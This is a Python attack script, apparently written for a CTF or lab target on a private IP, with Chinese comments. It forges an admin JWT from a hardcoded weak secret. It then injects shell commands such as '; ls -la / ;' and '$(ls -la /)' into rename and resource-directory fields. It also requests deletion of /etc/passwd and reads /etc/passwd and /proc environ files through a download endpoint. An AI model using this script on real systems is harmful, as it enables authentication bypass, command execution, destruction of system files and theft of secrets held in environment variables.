#!/usr/bin/env python3
"""
使用 Runtime.exec() 的反序列化或其他方法直接执行命令
或者尝试找到可以执行的路径
"""

import jwt
import requests
import json

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

headers = {"Cookie": f"token={admin_token}"}

print("[+] 尝试利用 rename 功能进行命令注入\n")

# 测试 rename 参数
test_payloads = [
    {"oldName": "test.txt", "newName": "; ls -la / ;"},
    {"oldName": "test.txt", "newName": "`ls -la /`"},
    {"oldName": "test.txt", "newName": "$(ls -la /)"},
]

for i, payload_data in enumerate(test_payloads):
    print(f"[*] 测试 Payload {i+1}: {payload_data}")
    try:
        r = requests.post(
            f"{TARGET}/admin/rename",
            headers=headers,
            json=payload_data,
            timeout=5
        )
        print(f"    状态: {r.status_code}")
        print(f"    响应: {r.text[:300]}")
        print()
    except Exception as e:
        print(f"    Error: {e}\n")

print("\n[*] 尝试通过 challengeResourceDir 注入命令\n")
cmd_payloads = [
    "/; ls -la / ;",
    "`ls -la /`",
    "$(ls -la /)",
    "/root;id;",
]

for payload_str in cmd_payloads:
    print(f"[*] 测试: {payload_str}")
    try:
        r = requests.post(
            f"{TARGET}/admin/challengeResourceDir",
            headers=headers,
            json={"resourceDir": payload_str},
            timeout=5
        )
        print(f"    状态: {r.status_code}")
        print(f"    响应: {r.text[:300]}")
        print()
    except Exception as e:
        print(f"    Error: {e}\n")

print("\n[*] 检查是否可以通过 delete 功能读取错误信息\n")
# 使用 delete 功能来触发错误消息，可能泄露路径信息
try:
    r = requests.post(
        f"{TARGET}/admin/delete",
        headers=headers,
        json={"path": "/etc/passwd"},
        timeout=5
    )
    print(f"    状态: {r.status_code}")
    print(f"    响应: {r.text}")
except Exception as e:
    print(f"    Error: {e}")

print("\n[*] 尝试读取系统文件获取信息\n")
system_files = [
    "/etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/1/environ",
    "/proc/1/cmdline",
]

for file_path in system_files:
    try:
        r = requests.get(
            f"{TARGET}/dashboard/download?path={file_path}",
            headers=headers,
            timeout=5
        )
        if r.status_code == 200 and "error" not in r.text.lower():
            print(f"[+] {file_path}:")
            print(f"    {r.text[:300]}\n")
    except:
        pass
